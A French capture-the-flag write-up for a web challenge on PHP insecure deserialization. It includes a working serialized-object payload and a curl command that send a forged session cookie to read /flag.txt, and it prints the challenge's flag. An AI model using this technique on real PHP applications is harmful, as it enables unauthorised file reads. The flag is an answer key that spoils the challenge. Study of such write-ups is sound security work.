# Reprise de Session

Web · 500 points · Créé par [@PercevalFox](https://github.com/PercevalFox)

Le cookie `session` est un objet PHP sérialisé encodé en base64, que le serveur remet à `unserialize()` sans rien vérifier.
Le code source fourni montre une classe `Template` dont la méthode `__wakeup()` lit le fichier donné par sa propriété
`path`. PHP appelle `__wakeup()` tout seul à la désérialisation : il suffit donc de fabriquer un objet `Template` dont le
`path` est `/flag.txt` et de le mettre dans le cookie.

```bash
O='O:8:"Template":2:{s:4:"path";s:9:"/flag.txt";s:7:"content";s:0:"";}'
C=$(printf '%s' "$O" | base64 -w0)
curl -s https://reprise-de-session.cyberzerk.fr/ -H "Cookie: session=$C"
```

Les nombres dans la chaîne sérialisée sont des longueurs : `s:9` pour les 9 caractères de `/flag.txt`.

**Flag :** `CyberZerk{PHP_uns3r1al1z3_p0p_ch41n_v14_w4k3up}`
